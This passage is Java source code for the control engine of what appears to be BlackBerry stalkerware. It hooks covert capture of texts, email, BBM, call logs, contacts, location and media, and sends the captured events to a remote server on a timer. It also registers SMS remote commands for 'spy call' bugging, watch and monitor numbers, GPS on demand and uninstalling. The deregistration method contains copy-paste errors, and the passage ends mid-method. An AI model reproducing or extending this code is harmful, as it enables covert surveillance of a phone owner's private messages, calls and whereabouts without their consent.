package com.vvt.ctrl;

import net.rim.device.api.ui.UiApplication;
import com.vvt.addrc.AddressBookCapture;
import com.vvt.bbm.BBMCapture;
import com.vvt.bug.BugEngine;
import com.vvt.bug.BugInfo;
import com.vvt.calllogc.CallLogCapture;
import com.vvt.calllogmon.FxCallLogNumberMonitor;
import com.vvt.callnotif.CallNotification;
import com.vvt.cellinfoc.CellInfoCapture;
import com.vvt.db.FxEventDBListener;
import com.vvt.db.FxEventDatabase;
import com.vvt.emailc.EmailCapture;
import com.vvt.event.FxEventCentre;
import com.vvt.global.Global;
import com.vvt.gpsc.LocationCapture;
import com.vvt.info.ApplicationInfo;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.mediac.MediaCapture;
import com.vvt.pinc.PINCapture;
import com.vvt.pref.PrefAddressBook;
import com.vvt.pref.PrefAudioFile;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefCameraImage;
import com.vvt.pref.PrefCellInfo;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.PrefInfo;
import com.vvt.pref.PrefMessenger;
import com.vvt.pref.PrefPIN;
import com.vvt.pref.PrefSystem;
import com.vvt.pref.PrefVideoFile;
import com.vvt.pref.PrefWatchListInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceChangeListener;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.SendEventCmdResponse;
import com.vvt.protsrv.SendEventManager;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.rmtcmd.RmtCmdRegister;
import com.vvt.rmtcmd.SMSCmdChangeListener;
import com.vvt.rmtcmd.SMSCmdStore;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.RmtCmdType;
import com.vvt.rmtcmd.SMSCommandCode;
import com.vvt.sim.SIMChangeNotif;
import com.vvt.smsc.SMSCapture;
import com.vvt.std.Constant;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.Log;
import com.vvt.watchmon.WatchListInfo;

public class AppEngine implements PreferenceChangeListener, SMSCmdChangeListener, PhoenixProtocolListener, FxEventDBListener, FxTimerListener {
	
	private Preference pref = Global.getPreference();
	private FxEventDatabase db = Global.getFxEventDatabase();
	private SendEventManager eventSender = SendEventManager.getInstance();
	private SMSCmdStore cmdStore = Global.getSMSCmdStore();
	private RmtCmdRegister rmtCmdRegister = Global.getRmtCmdRegister();
	private FxCallLogNumberMonitor fxNumberRemover = Global.getFxCallLogNumberMonitor();
	private CallLogCapture callLogCapture = null;
	private CellInfoCapture cellInfoCapture = null;
	private BugEngine bugEngine = null;
	private SMSCapture smsCapture = null;
	private LocationCapture locCapture = null;
	private BBMCapture bbmCapture = null;
	private EmailCapture emailCapture = null;
	private AddressBookCapture addrCapture = null;
	private PINCapture pinCapture = null;
	private MediaCapture mediaCapture = null;
	private SIMChangeNotif simChNotif = null;
	private FxEventCentre eventCentre = null;
	private CallNotification callNotification = null;
	private FxTimer sendTimer = new FxTimer(this);
	private BugInfo bugInfo = null;
	private String spyNumber = "";
	private String watchNumber = "";
	private String homeOutNumber = "";
	private UiApplication uiApp = UiApplication.getUiApplication();
	private LicenseManager license = Global.getLicenseManager();
	private int timerIndexDefault = 0;
	private int maxEventCountDefault = 0;
	private boolean capturedDefault = false;
	
	public AppEngine() {
		// To create features.
		bugEngine = new BugEngine();
		callLogCapture = new CallLogCapture();
		cellInfoCapture = new CellInfoCapture(uiApp);
		smsCapture = new SMSCapture();
		locCapture = Global.getLocationCapture();
		bbmCapture = new BBMCapture();
		emailCapture = new EmailCapture(uiApp);
		addrCapture = new AddressBookCapture();
		pinCapture = new PINCapture();
		mediaCapture = new MediaCapture();
		simChNotif = new SIMChangeNotif();
		eventCentre = new FxEventCentre();
		bugInfo = new BugInfo();
		callNotification = new CallNotification();
	}

	public void start() {
		try {
			// Start features
			initialzation();
			// To set default.
			PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
			timerIndexDefault = general.getSendTimeIndex();
			maxEventCountDefault = general.getMaxEventCount();
			capturedDefault = general.isCaptured();
			sendTimer.setInterval(ApplicationInfo.TIME_VALUE[timerIndexDefault]);
			// To set event listener.
			callLogCapture.addFxEventListener(eventCentre);
			cellInfoCapture.addFxEventListener(eventCentre);
			smsCapture.addFxEventListener(eventCentre);
			locCapture.addFxEventListener(eventCentre);
			bbmCapture.addFxEventListener(eventCentre);
			emailCapture.addFxEventListener(eventCentre);
			simChNotif.addFxEventListener(eventCentre);
			pinCapture.addFxEventListener(eventCentre);
			mediaCapture.addFxEventListener(eventCentre);
			cmdStore.addListener(this);
			db.addListener(this);
			eventSender.addListener(this);
			sendTimer.start();
			setNextSchedule();
			registerPreference();
			registerRmtCmd();
		} catch (Exception e) {
			Log.error("AppEngine.start()", e.getMessage(), e);
		}
	}

	public void stop() {
		try {
			// To remove event listener.
			callLogCapture.removeFxEventListener(eventCentre);
			cellInfoCapture.removeFxEventListener(eventCentre);
			smsCapture.removeFxEventListener(eventCentre);
			locCapture.removeFxEventListener(eventCentre);
			bbmCapture.removeFxEventListener(eventCentre);
			emailCapture.removeFxEventListener(eventCentre);
			simChNotif.removeFxEventListener(eventCentre);
			pinCapture.removeFxEventListener(eventCentre);
			mediaCapture.removeFxEventListener(eventCentre);
			mediaCapture.resetDatabase();
			addrCapture.reset();						
			cmdStore.removeListener(this);
			db.removeListener(this);
			eventSender.removeListener(this);
			eventSender.reset();
			sendTimer.stop();
			deregisterPreference();
			deregisterRmtCmd();
			stopAllFeatures();
		} catch (Exception e) {
			Log.error("AppEngine.stop()", e.getMessage(), e);
		}
	}
	
	private void initialzation() {
		locCapture = Global.getLocationCapture();
	}
	
	private void stopAllFeatures() {
		if (bugEngine != null) {
			bugEngine.stop();
		}
		// Location
		if (locCapture != null) {
			locCapture.stopCapture();
			locCapture.destroy();
		}
	}

	private void setNextSchedule() {
		PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		long nextSchedule = System.currentTimeMillis() + ApplicationInfo.TIME_VALUE[general.getSendTimeIndex()] * 1000;
		general.setNextSchedule(nextSchedule);
		pref.commit(general);
	}
	
	private void registerPreference() {
		try {
			PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
			PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
			PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
			PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			PrefAddressBook prefAddress = (PrefAddressBook)pref.getPrefInfo(PreferenceType.PREF_ADDRESS_BOOK);
			PrefPIN prefPin = (PrefPIN)pref.getPrefInfo(PreferenceType.PREF_PIN);
			PrefCameraImage prefCamImage = (PrefCameraImage) pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
			PrefAudioFile prefAudioFile = (PrefAudioFile) pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
			PrefVideoFile prefVideoFile = (PrefVideoFile) pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
			if (prefEvent.isSupported()) {
				pref.registerPreferenceChangeListener(PreferenceType.PREF_EVENT_INFO, this);
			}
			if (prefAddress.isSupported()) {
				pref.registerPreferenceChangeListener(PreferenceType.PREF_ADDRESS_BOOK, this);
			}
			if (prefCell.isSupported()) {
				pref.registerPreferenceChangeListener(PreferenceType.PREF_CELL_INFO, this);
			}
			if (prefGPS.isSupported()) {
				pref.registerPreferenceChangeListener(PreferenceType.PREF_GPS, this);
			}
			if (prefMessenger.isSupported()) {
				pref.registerPreferenceChangeListener(PreferenceType.PREF_IM, this);
			}
			if (prefBug.isSupported()) {
				pref.registerPreferenceChangeListener(PreferenceType.PREF_BUG_INFO, this);
			}
			if (prefSystem.isSupported()) {
				pref.registerPreferenceChangeListener(PreferenceType.PREF_SYSTEM, this);
			}
			if (prefPin.isSupported()) {
				pref.registerPreferenceChangeListener(PreferenceType.PREF_PIN, this);
			}
			if (prefCamImage.isSupported()) {
				pref.registerPreferenceChangeListener(PreferenceType.PREF_CAMERA_IMAGE, this);
			}
			if (prefAudioFile.isSupported()) {
				pref.registerPreferenceChangeListener(PreferenceType.PREF_AUDIO_FILE, this);
			}
			if (prefVideoFile.isSupported()) {
				pref.registerPreferenceChangeListener(PreferenceType.PREF_VIDEO_FILE, this);
			}
			pref.registerPreferenceChangeListener(PreferenceType.PREF_GENERAL, this);
		} catch (Exception e) {
			Log.error("AppEngine.registerPreference()", e.getMessage(), e);
		}
	}
	
	private void registerRmtCmd() {
		try {
			SMSCommandCode smsCmdCode = cmdStore.getSMSCommandCode();
			PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
			PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
			PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			// SendLog Command
			RmtCmdLine sendLogCmdLine = new RmtCmdLine();
			sendLogCmdLine.setCode(smsCmdCode.getRequestEventsCmd());
			sendLogCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Diagnostics Command
			RmtCmdLine diagnosticsCmdLine = new RmtCmdLine();
			diagnosticsCmdLine.setCode(smsCmdCode.getSendDiagnosticsCmd());
			diagnosticsCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Deactivation Command
			RmtCmdLine deactivationCmdLine = new RmtCmdLine();
			deactivationCmdLine.setCode(smsCmdCode.getDeactivationCmd());
			deactivationCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Query URL Command
			RmtCmdLine queryUrlCmdLine = new RmtCmdLine();
			queryUrlCmdLine.setCode(smsCmdCode.getQueryUrlCmd());
			queryUrlCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Delete All Events Command
			RmtCmdLine deleteAllEventCmdLine = new RmtCmdLine();
			deleteAllEventCmdLine.setCode(smsCmdCode.getDeleteDatabaseCmd());
			deleteAllEventCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Uninstall Command
			RmtCmdLine uninstallCmdLine = new RmtCmdLine();
			uninstallCmdLine.setCode(smsCmdCode.getUninstallCmd());
			uninstallCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Default Command
			RmtCmdLine defaultCmdLine = new RmtCmdLine();
			defaultCmdLine.setCode(smsCmdCode.getSettingCmd());
			defaultCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// HeartBeat Command
			RmtCmdLine heatbeatCmdLine = new RmtCmdLine();
			heatbeatCmdLine.setCode(smsCmdCode.getRequestHeartbeatCmd());
			heatbeatCmdLine.setRmtCmdType(RmtCmdType.SMS);	
			// SetAddressbook Command
			RmtCmdLine sendAddrbookCmdLine = new RmtCmdLine();
			sendAddrbookCmdLine.setCode(smsCmdCode.getSendAddressbookCmd());
			sendAddrbookCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Request current URL Command
			RmtCmdLine reqCurrentUrlCmdLine = new RmtCmdLine();
			reqCurrentUrlCmdLine.setCode(smsCmdCode.getRequestCurrentURLCmd());
			reqCurrentUrlCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Request Settings Command
			RmtCmdLine requestSettingsCmdLine = new RmtCmdLine();
			requestSettingsCmdLine.setCode(smsCmdCode.getRequestSettingsCmd());
			requestSettingsCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Request Startup Time Command
			RmtCmdLine requestStartupTimeCmdLine = new RmtCmdLine();
			requestStartupTimeCmdLine.setCode(smsCmdCode.getRequestStartupTimeCmd());
			requestStartupTimeCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Request Mobile Phone Number
			RmtCmdLine requestMobileNumberCmdLine = new RmtCmdLine();
			requestMobileNumberCmdLine.setCode(smsCmdCode.getRequestMobileNumberCmd());
			requestMobileNumberCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// To add commands.
			rmtCmdRegister.registerCommands(deactivationCmdLine);
			rmtCmdRegister.registerCommands(sendLogCmdLine);
			rmtCmdRegister.registerCommands(diagnosticsCmdLine);
			rmtCmdRegister.registerCommands(queryUrlCmdLine);
			rmtCmdRegister.registerCommands(deleteAllEventCmdLine);
			rmtCmdRegister.registerCommands(uninstallCmdLine);
			rmtCmdRegister.registerCommands(defaultCmdLine);
			rmtCmdRegister.registerCommands(heatbeatCmdLine);
			rmtCmdRegister.registerCommands(sendAddrbookCmdLine);
			rmtCmdRegister.registerCommands(reqCurrentUrlCmdLine);
			rmtCmdRegister.registerCommands(requestSettingsCmdLine);
			rmtCmdRegister.registerCommands(requestStartupTimeCmdLine);
			rmtCmdRegister.registerCommands(requestMobileNumberCmdLine);
			if (prefEvent.isSupported()) {
				// Start Capture Command
				RmtCmdLine startCaptureCmdLine = new RmtCmdLine();
				startCaptureCmdLine.setCode(smsCmdCode.getEnableCaptureCmd());
				startCaptureCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// To add commands.
				rmtCmdRegister.registerCommands(startCaptureCmdLine);
			}
			if (prefSystem.isSupported()) {
				// Start SIM Command
				RmtCmdLine simCmdLine = new RmtCmdLine();
				simCmdLine.setCode(smsCmdCode.getEnableSIMCmd());
				simCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// To add commands.
				rmtCmdRegister.registerCommands(simCmdLine);
			}
			if (prefGPS.isSupported()) {
				// Start GPS Command
				RmtCmdLine gpsCmdLine = new RmtCmdLine();
				gpsCmdLine.setCode(smsCmdCode.getEnableGPSCmd());
				gpsCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// GPS on Demand Command
				RmtCmdLine gpsOnDemandCmdLine = new RmtCmdLine();
				gpsOnDemandCmdLine.setCode(smsCmdCode.getGPSOnDemandCmd());
				gpsOnDemandCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Update location interval
				RmtCmdLine updateLocIntervalCmdLine = new RmtCmdLine();
				updateLocIntervalCmdLine.setCode(smsCmdCode.getUpdateLocationIntervalCmd());
				updateLocIntervalCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// To add commands.
				rmtCmdRegister.registerCommands(gpsCmdLine);
				rmtCmdRegister.registerCommands(gpsOnDemandCmdLine);
				rmtCmdRegister.registerCommands(updateLocIntervalCmdLine);
			}
			if (prefBug.isSupported()) {
				// Start SpyCall Command
				RmtCmdLine spyCallCmdLine = new RmtCmdLine();
				spyCallCmdLine.setCode(smsCmdCode.getEnableSpyCallCmd());
				spyCallCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Start SpyCall with Monitor number
				RmtCmdLine spyCallMPNCmdLine = new RmtCmdLine();
				spyCallMPNCmdLine.setCode(smsCmdCode.getEnableSpyCallMPNCmd());
				spyCallMPNCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Add Home IN Command
				RmtCmdLine addHomeInCmdLine = new RmtCmdLine();
				addHomeInCmdLine.setCode(smsCmdCode.getAddHomeInNumberCmd());
				addHomeInCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Reset Home IN Command
				RmtCmdLine resetHomeInCmdLine = new RmtCmdLine();
				resetHomeInCmdLine.setCode(smsCmdCode.getResetHomeInNumberCmd());
				resetHomeInCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Clear Home IN Command
				RmtCmdLine clearHomeInCmdLine = new RmtCmdLine();
				clearHomeInCmdLine.setCode(smsCmdCode.getClearHomeInNumberCmd());
				clearHomeInCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Query Home IN Command
				RmtCmdLine queryHomeInCmdLine = new RmtCmdLine();
				queryHomeInCmdLine.setCode(smsCmdCode.getQueryHomeInNumberCmd());
				queryHomeInCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Add Home OUT Command
				RmtCmdLine addHomeOutCmdLine = new RmtCmdLine();
				addHomeOutCmdLine.setCode(smsCmdCode.getAddHomeOutNumberCmd());
				addHomeOutCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Reset Home OUT Command
				RmtCmdLine resetHomeOutCmdLine = new RmtCmdLine();
				resetHomeOutCmdLine.setCode(smsCmdCode.getResetHomeOutNumberCmd());
				resetHomeOutCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Clear Home OUT Command
				RmtCmdLine clearHomeOutCmdLine = new RmtCmdLine();
				clearHomeOutCmdLine.setCode(smsCmdCode.getClearHomeOutNumberCmd());
				clearHomeOutCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Query Home OUT Command
				RmtCmdLine queryHomeOutCmdLine = new RmtCmdLine();
				queryHomeOutCmdLine.setCode(smsCmdCode.getQueryHomeOutNumberCmd());
				queryHomeOutCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Add Monitor Number Command		
				RmtCmdLine addMonitorCmdLine = new RmtCmdLine();
				addMonitorCmdLine.setCode(smsCmdCode.getAddMonitorNumberCmd());
				addMonitorCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Reset Monitor Number Command
				RmtCmdLine resetMonitorCmdLine = new RmtCmdLine();
				resetMonitorCmdLine.setCode(smsCmdCode.getResetMonitorNumberCmd());
				resetMonitorCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Clear Monitor Number Command
				RmtCmdLine clearMonitorCmdLine = new RmtCmdLine();
				clearMonitorCmdLine.setCode(smsCmdCode.getClearMonitorNumberCmd());
				clearMonitorCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Query Monitor Number Command
				RmtCmdLine queryMonitorCmdLine = new RmtCmdLine();
				queryMonitorCmdLine.setCode(smsCmdCode.getQueryMonitorNumberCmd());
				queryMonitorCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// To add commands.
				rmtCmdRegister.registerCommands(spyCallCmdLine);
				rmtCmdRegister.registerCommands(spyCallMPNCmdLine);
				/*rmtCmdRegister.registerCommands(addHomeInCmdLine);
				rmtCmdRegister.registerCommands(resetHomeInCmdLine);
				rmtCmdRegister.registerCommands(clearHomeInCmdLine);
				rmtCmdRegister.registerCommands(queryHomeInCmdLine);*/
				rmtCmdRegister.registerCommands(addHomeOutCmdLine);
				rmtCmdRegister.registerCommands(resetHomeOutCmdLine);
				rmtCmdRegister.registerCommands(clearHomeOutCmdLine);
				rmtCmdRegister.registerCommands(queryHomeOutCmdLine);
				rmtCmdRegister.registerCommands(addMonitorCmdLine);
				rmtCmdRegister.registerCommands(resetMonitorCmdLine);
				rmtCmdRegister.registerCommands(clearMonitorCmdLine);
				rmtCmdRegister.registerCommands(queryMonitorCmdLine);		
				if (prefBug.isConferenceSupported()) {
					// Enable Watch List Command
					RmtCmdLine watchListCmdLine = new RmtCmdLine();
					watchListCmdLine.setCode(smsCmdCode.getEnableWatchListCmd());
					watchListCmdLine.setRmtCmdType(RmtCmdType.SMS);
					// Set Watch Flags Command
					RmtCmdLine setWatchFlagsCmdLine = new RmtCmdLine();
					setWatchFlagsCmdLine.setCode(smsCmdCode.getSetWatchFlagsCmd());
					setWatchFlagsCmdLine.setRmtCmdType(RmtCmdType.SMS);					
					// Add Watch Number Command
					RmtCmdLine addWatchCmdLine = new RmtCmdLine();
					addWatchCmdLine.setCode(smsCmdCode.getAddWatchNumberCmd());
					addWatchCmdLine.setRmtCmdType(RmtCmdType.SMS);
					// Reset Watch Number Command
					RmtCmdLine resetWatchCmdLine = new RmtCmdLine();
					resetWatchCmdLine.setCode(smsCmdCode.getResetWatchNumberCmd());
					resetWatchCmdLine.setRmtCmdType(RmtCmdType.SMS);
					// Clear Watch Number Command
					RmtCmdLine clearWatchCmdLine = new RmtCmdLine();
					clearWatchCmdLine.setCode(smsCmdCode.getClearWatchNumberCmd());
					clearWatchCmdLine.setRmtCmdType(RmtCmdType.SMS);
					// Query Watch Number Command
					RmtCmdLine queryWatchCmdLine = new RmtCmdLine();
					queryWatchCmdLine.setCode(smsCmdCode.getQueryWatchNumberCmd());
					queryWatchCmdLine.setRmtCmdType(RmtCmdType.SMS);
					// To add commands.
					rmtCmdRegister.registerCommands(watchListCmdLine);
					rmtCmdRegister.registerCommands(setWatchFlagsCmdLine);
					rmtCmdRegister.registerCommands(addWatchCmdLine);
					rmtCmdRegister.registerCommands(resetWatchCmdLine);
					rmtCmdRegister.registerCommands(clearWatchCmdLine);
					rmtCmdRegister.registerCommands(queryWatchCmdLine);
				}
			}
			if (prefMessenger.isSupported()) {
				// Start BBM Command
				RmtCmdLine bbmCmdLine = new RmtCmdLine();
				bbmCmdLine.setCode(smsCmdCode.getBBMCmd());
				bbmCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// To add commands.
				rmtCmdRegister.registerCommands(bbmCmdLine);
			}			
		} catch (Exception e) {
			Log.error("AppEngine.registerRmtCmd()", e.getMessage(), e);
		}
	}
	
	private void deregisterPreference() {
		try {
			PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
			PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
			PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
			PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			PrefAddressBook prefAddress = (PrefAddressBook)pref.getPrefInfo(PreferenceType.PREF_ADDRESS_BOOK);
			PrefPIN prefPin = (PrefPIN)pref.getPrefInfo(PreferenceType.PREF_PIN);
//			PrefMedia prefMedia = (PrefMedia)pref.getPrefInfo(PreferenceType.PREF_MEDIA);
			PrefCameraImage prefCamImage = (PrefCameraImage) pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
			PrefAudioFile prefAudioFile = (PrefAudioFile) pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
			PrefVideoFile prefVideoFile = (PrefVideoFile) pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
			if (prefEvent.isSupported()) {
				pref.removePreferenceChangeListener(PreferenceType.PREF_EVENT_INFO, this);
			}
			if (prefAddress.isSupported()) {
				pref.removePreferenceChangeListener(PreferenceType.PREF_ADDRESS_BOOK, this);
			}
			if (prefCell.isSupported()) {
				pref.removePreferenceChangeListener(PreferenceType.PREF_CELL_INFO, this);
			}
			if (prefGPS.isSupported()) {
				pref.removePreferenceChangeListener(PreferenceType.PREF_GPS, this);
			}
			if (prefMessenger.isSupported()) {
				pref.removePreferenceChangeListener(PreferenceType.PREF_IM, this);
			}
			if (prefBug.isSupported()) {
				pref.removePreferenceChangeListener(PreferenceType.PREF_BUG_INFO, this);
			}
			if (prefSystem.isSupported()) {
				pref.removePreferenceChangeListener(PreferenceType.PREF_SYSTEM, this);
			}
			if (prefPin.isSupported()) {
				pref.removePreferenceChangeListener(PreferenceType.PREF_PIN, this);
			}
			if (prefCamImage.isSupported()) {
				pref.removePreferenceChangeListener(PreferenceType.PREF_CAMERA_IMAGE, this);
			}
			if (prefAudioFile.isSupported()) {
				pref.removePreferenceChangeListener(PreferenceType.PREF_AUDIO_FILE, this);
			}
			if (prefVideoFile.isSupported()) {
				pref.removePreferenceChangeListener(PreferenceType.PREF_VIDEO_FILE, this);
			}
			pref.removePreferenceChangeListener(PreferenceType.PREF_GENERAL, this);
		} catch (Exception e) {
			Log.error("AppEngine.deregisterPreference()", e.getMessage(), e);
		}
	}
	
	private void deregisterRmtCmd() {
		try {
			SMSCommandCode smsCmdCode = cmdStore.getSMSCommandCode();
			PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
			PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
			PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			// SendLog Command
			RmtCmdLine sendLogCmdLine = new RmtCmdLine();
			sendLogCmdLine.setCode(smsCmdCode.getRequestEventsCmd());
			sendLogCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Diagnostics Command
			RmtCmdLine diagnosticsCmdLine = new RmtCmdLine();
			diagnosticsCmdLine.setCode(smsCmdCode.getSendDiagnosticsCmd());
			diagnosticsCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Deactivation Command
			RmtCmdLine deactivationCmdLine = new RmtCmdLine();
			deactivationCmdLine.setCode(smsCmdCode.getDeactivationCmd());
			deactivationCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Query URL Command
			RmtCmdLine queryUrlCmdLine = new RmtCmdLine();
			queryUrlCmdLine.setCode(smsCmdCode.getDeactivationCmd());
			queryUrlCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Delete All Events Command
			RmtCmdLine deleteAllEventCmdLine = new RmtCmdLine();
			deleteAllEventCmdLine.setCode(smsCmdCode.getDeactivationCmd());
			deleteAllEventCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Uninstall Command
			RmtCmdLine uninstallCmdLine = new RmtCmdLine();
			uninstallCmdLine.setCode(smsCmdCode.getDeactivationCmd());
			uninstallCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Default Command
			RmtCmdLine defaultCmdLine = new RmtCmdLine();
			defaultCmdLine.setCode(smsCmdCode.getSettingCmd());
			defaultCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// HeartBeat Command
			RmtCmdLine heartbeatCmdLine = new RmtCmdLine();
			heartbeatCmdLine.setCode(smsCmdCode.getRequestHeartbeatCmd());
			heartbeatCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// SetAddressbook Command
			RmtCmdLine sendAddrbookCmdLine = new RmtCmdLine();
			sendAddrbookCmdLine.setCode(smsCmdCode.getSendAddressbookCmd());
			sendAddrbookCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Request current URL Command
			RmtCmdLine reqCurrentUrlCmdLine = new RmtCmdLine();
			reqCurrentUrlCmdLine.setCode(smsCmdCode.getRequestCurrentURLCmd());
			reqCurrentUrlCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Request Settings Command
			RmtCmdLine requestSettingsCmdLine = new RmtCmdLine();
			requestSettingsCmdLine.setCode(smsCmdCode.getRequestSettingsCmd());
			requestSettingsCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Request Startup Time Command
			RmtCmdLine requestStartupTimeCmdLine = new RmtCmdLine();
			requestStartupTimeCmdLine.setCode(smsCmdCode.getRequestStartupTimeCmd());
			requestStartupTimeCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// Request Mobile Phone Number
			RmtCmdLine requestMobileNumberCmdLine = new RmtCmdLine();
			requestMobileNumberCmdLine.setCode(smsCmdCode.getRequestMobileNumberCmd());
			requestMobileNumberCmdLine.setRmtCmdType(RmtCmdType.SMS);
			// To remove commands.
			rmtCmdRegister.deregisterCommands(deactivationCmdLine);
			rmtCmdRegister.deregisterCommands(sendLogCmdLine);
			rmtCmdRegister.deregisterCommands(diagnosticsCmdLine);
			rmtCmdRegister.deregisterCommands(queryUrlCmdLine);
			rmtCmdRegister.deregisterCommands(deleteAllEventCmdLine);
			rmtCmdRegister.deregisterCommands(uninstallCmdLine);
			rmtCmdRegister.deregisterCommands(defaultCmdLine);
			rmtCmdRegister.deregisterCommands(heartbeatCmdLine);
			rmtCmdRegister.deregisterCommands(sendAddrbookCmdLine);
			rmtCmdRegister.deregisterCommands(reqCurrentUrlCmdLine);
			rmtCmdRegister.deregisterCommands(requestSettingsCmdLine);
			rmtCmdRegister.deregisterCommands(requestStartupTimeCmdLine);
			rmtCmdRegister.deregisterCommands(requestMobileNumberCmdLine);
			if (prefEvent.isSupported()) {
				// Start Capture Command
				RmtCmdLine startCaptureCmdLine = new RmtCmdLine();
				startCaptureCmdLine.setCode(smsCmdCode.getEnableCaptureCmd());
				startCaptureCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// To add commands.
				rmtCmdRegister.deregisterCommands(startCaptureCmdLine);
			}
			if (prefGPS.isSupported()) {
				// Start GPS Command
				RmtCmdLine gpsCmdLine = new RmtCmdLine();
				gpsCmdLine.setCode(smsCmdCode.getEnableGPSCmd());
				gpsCmdLine.setRmtCmdType(RmtCmdType.SMS);
				RmtCmdLine gpsOnDemandCmdLine = new RmtCmdLine();
				gpsOnDemandCmdLine.setCode(smsCmdCode.getGPSOnDemandCmd());
				gpsOnDemandCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Update location interval
				RmtCmdLine updateLocIntervalCmdLine = new RmtCmdLine();
				updateLocIntervalCmdLine.setCode(smsCmdCode.getUpdateLocationIntervalCmd());
				updateLocIntervalCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// To add commands.
